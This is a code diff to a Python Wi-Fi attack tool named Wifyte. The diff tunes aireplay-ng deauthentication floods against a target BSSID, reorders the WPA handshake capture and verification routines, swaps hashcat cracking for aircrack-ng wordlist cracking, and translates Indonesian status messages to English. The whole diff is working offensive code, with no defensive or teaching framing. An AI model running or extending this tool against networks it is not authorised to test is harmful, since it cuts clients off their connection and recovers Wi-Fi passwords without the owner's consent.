@@ -315,7 +315,7 @@ class Wifyte:
         deauth_cmd1 = [
             "aireplay-ng",
             "--deauth",
-            "120",  # more deauth packets
+            "25",  # more deauth packets
             "-a",
             network.bssid,
             self.monitor_interface,
@@ -335,58 +335,11 @@ class Wifyte:
         print(f"{Colors.GREEN}[+] Deauth packets successfully sent{Colors.ENDC}")
         return True
 
-    def check_for_handshake(self, cap_file: str) -> bool:
-        """Check the capture file for handshake"""
-        if not os.path.exists(cap_file):
-            return False
-
-        # Method 1: Using aircrack-ng
-        aircrack_result = self.execute_command(["aircrack-ng", cap_file])
-        if aircrack_result and "1 handshake" in aircrack_result.stdout:
-            return True
-
-        # Method 2: Using cowpatty (if available) - more accurate verification
-        cowpatty_path = shutil.which("cowpatty")
-        if cowpatty_path:
-            cowpatty_result = self.execute_command(["cowpatty", "-c", "-r", cap_file])
-            if (
-                cowpatty_result
-                and "Collected all necessary data to mount crack against WPA"
-                in cowpatty_result.stdout
-            ):
-                return True
-
-        # Method 3: Using pyrit (if available) - more accurate verification
-        pyrit_path = shutil.which("pyrit")
-        if pyrit_path:
-            pyrit_result = self.execute_command(["pyrit", "-r", cap_file, "analyze"])
-            if (
-                pyrit_result
-                and "handshake(s)" in pyrit_result.stdout
-                and not "0 handshake(s)" in pyrit_result.stdout
-            ):
-                return True
-
-        return False
-
-    def handshake_watcher(self, capture_path: str, network: WiFiNetwork):
-        """Thread to monitor the capture file and check for handshake"""
-        cap_file = f"{capture_path}-01.cap"
-        check_interval = 1  # Check every 1 second
-
-        while not self.stop_capture:
-            if os.path.exists(cap_file) and self.check_for_handshake(cap_file):
-                print(f"{Colors.GREEN}[+] Handshake detected!{Colors.ENDC}")
-                self.handshake_found = True
-                self.stop_capture = True
-                break
-            time.sleep(check_interval)
-
     def capture_handshake(self, network: WiFiNetwork) -> Optional[str]:
         """Capture handshake from the target network using an enhanced method"""
         if not self.monitor_interface:
             print(
-                f"{Colors.RED}[!] Error: Tidak ada interface monitor mode{Colors.ENDC}"
+                f"{Colors.RED}[!] Error: No interfaces with monitor mode{Colors.ENDC}"
             )
             return None
 
@@ -427,7 +380,7 @@ class Wifyte:
         watcher_thread.start()
 
         # More aggressive deauth strategy
-        max_attempts = 12  # More attempts
+        max_attempts = 30  # More attempts
         attempt = 0
 
         try:
@@ -444,7 +397,7 @@ class Wifyte:
                         [
                             "aireplay-ng",
                             "--deauth",
-                            "60",
+                            "25",
                             "-a",
                             network.bssid,
                             self.monitor_interface,
@@ -467,7 +420,7 @@ class Wifyte:
                             [
                                 "aireplay-ng",
                                 "--deauth",
-                                "120",
+                                "25",
                                 "-a",
                                 network.bssid,
                                 self.monitor_interface,
@@ -477,7 +430,7 @@ class Wifyte:
                         )
 
                 # Wait a moment between deauth attempts (shorter than before)
-                for i in range(3):
+                for i in range(5):
                     if self.handshake_found:
                         break
                     time.sleep(1)
@@ -498,7 +451,7 @@ class Wifyte:
                 self.handshake_dir, f"{network.essid.replace(' ', '_')}.cap"
             )
             shutil.copy(cap_file, final_path)
-            print(f"{Colors.GREEN}[+] Handshake disimpan ke {final_path}{Colors.ENDC}")
+            print(f"{Colors.GREEN}[+] Handshake saved to {final_path}{Colors.ENDC}")
 
             return final_path
 
@@ -509,6 +462,53 @@ class Wifyte:
             self.stop_capture = True
             capture_proc.send_signal(signal.SIGTERM)
             capture_proc.wait()
+
+    def handshake_watcher(self, capture_path: str, network: WiFiNetwork):
+        """Thread to monitor the capture file and check for handshake"""
+        cap_file = f"{capture_path}-01.cap"
+        check_interval = 1  # Check every 1 second
+
+        while not self.stop_capture:
+            if os.path.exists(cap_file) and self.check_for_handshake(cap_file):
+                print(f"{Colors.GREEN}[+] Handshake detected!{Colors.ENDC}")
+                self.handshake_found = True
+                self.stop_capture = True
+                break
+            time.sleep(check_interval)
+
+    def check_for_handshake(self, cap_file: str) -> bool:
+        """Check the capture file for handshake"""
+        if not os.path.exists(cap_file):
+            return False
+
+        # Method 1: Using aircrack-ng
+        aircrack_result = self.execute_command(["aircrack-ng", cap_file])
+        if aircrack_result and "1 handshake" in aircrack_result.stdout:
+            return True
+
+        # Method 2: Using cowpatty (if available) - more accurate verification
+        cowpatty_path = shutil.which("cowpatty")
+        if cowpatty_path:
+            cowpatty_result = self.execute_command(["cowpatty", "-c", "-r", cap_file])
+            if (
+                cowpatty_result
+                and "Collected all necessary data to mount crack against WPA"
+                in cowpatty_result.stdout
+            ):
+                return True
+
+        # Method 3: Using pyrit (if available) - more accurate verification
+        pyrit_path = shutil.which("pyrit")
+        if pyrit_path:
+            pyrit_result = self.execute_command(["pyrit", "-r", cap_file, "analyze"])
+            if (
+                pyrit_result
+                and "handshake(s)" in pyrit_result.stdout
+                and not "0 handshake(s)" in pyrit_result.stdout
+            ):
+                return True
+
+        return False
 
     def verify_handshake(self, handshake_path: str) -> bool:
         """Verify if the handshake is valid using multiple methods"""
@@ -575,38 +575,8 @@ class Wifyte:
 
             if os.path.exists(hccapx_file):
                 print(
-                    f"{Colors.BLUE}[*] Menggunakan hashcat untuk cracking (lebih cepat)...{Colors.ENDC}"
+                    f"{Colors.BLUE}[*] Using aircrack-ng for cracking...{Colors.ENDC}"
                 )
-                hashcat_cmd = [
-                    "hashcat",
-                    "-m",
-                    "2500",
-                    "-a",
-                    "0",
-                    hccapx_file,
-                    self.wordlist_path,
-                    "--force",
-                ]
-                result = self.execute_command(hashcat_cmd)
-
-                if (
-                    result
-                    and "Recovered" in result.stdout
-                    and not "Recovered.....: 0/" in result.stdout
-                ):
-                    # Ekstrak password dari output hashcat
-                    for line in result.stdout.split("\n"):
-                        if ":" + essid + ":" in line:
-                            password = line.split(":")[-1]
-                            print(
-                                f"{Colors.GREEN}[+] Password ditemukan: {Colors.BOLD}{password}{Colors.ENDC}"
-                            )
-                            return password
-
-        # Metode 2: Aircrack-ng (fallback)
-        print(
-            f"{Colors.BLUE}[*] Menggunakan aircrack-ng untuk cracking...{Colors.ENDC}"
-        )
         result = self.execute_command(
             ["aircrack-ng", "-w", self.wordlist_path, handshake_path]
         )
@@ -643,7 +613,7 @@ class Wifyte:
         print(banner)
 
     def run(self):
-        """Menjalankan program utama"""
+        """Run Main Program"""
         self.display_banner()
 
         # Setup interface
@@ -692,7 +662,7 @@ class Wifyte:
         # Capture handshake
         handshake_path = self.capture_handshake(target_network)
         if not handshake_path:
-            print(f"{Colors.RED}[!] Failed capturing handshake{Colors.ENDC}")
+            print(f"{Colors.RED}[!] Failed capturing handshake!{Colors.ENDC}")
             self.exit_program()
             return
 
